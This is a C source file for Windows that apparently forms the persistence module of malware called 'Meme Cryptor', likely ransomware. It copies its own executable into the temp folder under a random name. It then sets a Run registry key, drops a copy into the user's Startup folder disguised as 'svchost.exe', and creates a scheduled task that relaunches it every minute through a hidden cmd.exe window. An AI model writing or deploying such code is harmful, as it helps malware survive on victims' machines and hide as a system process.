#include "Persistent.h"
#include "Crypto.h"
LPCSTR tempFile_path;
int createTemp() {
	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
	BYTE randomBuffer[16];
	LPSTR lpCurrentFileName = (LPSTR)calloc(MAX_PATH, 1);
	HANDLE tempFile;
	int return_val = -1;
	if (!GetTempPathA(MAX_PATH, lpTemp)) {
		goto CLEANUP;
	}

	if (!GetModuleFileNameA(0, lpCurrentFileName, MAX_PATH)) {
		goto CLEANUP;
	}


	if (!CryptGenRandom(hCryptProv, 15, randomBuffer)) {
		goto CLEANUP;
	}

	for (int i = 0; i < 15; i++) {
		randomBuffer[i] = (randomBuffer[i] % 26) + 65;
		printf("%d: %c\n", i, randomBuffer[i]);
	}
	randomBuffer[15] = 0;
	strcat(lpTemp, (LPSTR)randomBuffer);
	strcat(lpTemp, ".exe");
	printf("%s\n", lpTemp);
	tempFile = CreateFileA((LPCSTR)randomBuffer, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (tempFile == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}

	if (!CopyFileA(lpCurrentFileName, lpTemp, TRUE)) {
		goto CLEANUP;
	}

	return_val = 0;
	tempFile_path = lpTemp;
CLEANUP:
	free(lpCurrentFileName);
	return return_val;
}

int persistRegistry() {
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
		return -1;
	}
	if (RegSetKeyValueA(hKey, NULL, "Meme Cryptor", REG_SZ, tempFile_path, strlen(tempFile_path)) != ERROR_SUCCESS) {
		return -1;
	}
	return 0;

}

// will raise alert
int persistFile() {
	if (createTemp() == -1) {
		return -1;
	}

	if (!CopyFileA(tempFile_path, "C:\\Users\\DongChuong\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe", TRUE)) {
		return -1;
	}
	return 0;
}

int persistSchedule(BOOL start) {
	char finalCommand[MAX_PATH];

	LPCSTR command;
	if (start) {
		command = "/C schtasks /Create /SC MINUTE /TN \"Meme Cryptor\" /TR \"%s\" /f";
	}
	else {
		command = "/C schtasks /Delete /TN \"Meme Cryptor\" /TR \"%s\" /f";
	}

	if (sprintf(finalCommand, (char*)command, tempFile_path) < 0) {
		return -1;
	}

	if ((int)ShellExecuteA(0, "open", "cmd.exe", (LPCSTR)finalCommand, 0, SW_HIDE) <= 32) {
		return -1;
	}

	return 0;
}


int mainPersist(BOOL start) {
	if (start) {
		if (createTemp() == -1) {
			return -1;
		}

		if (persistRegistry() == -1) {
			return -1;
		}
	}

	if (persistSchedule(start) == -1) {
		return -1;
	}
	return 0;
}


int environmentSetup() {

}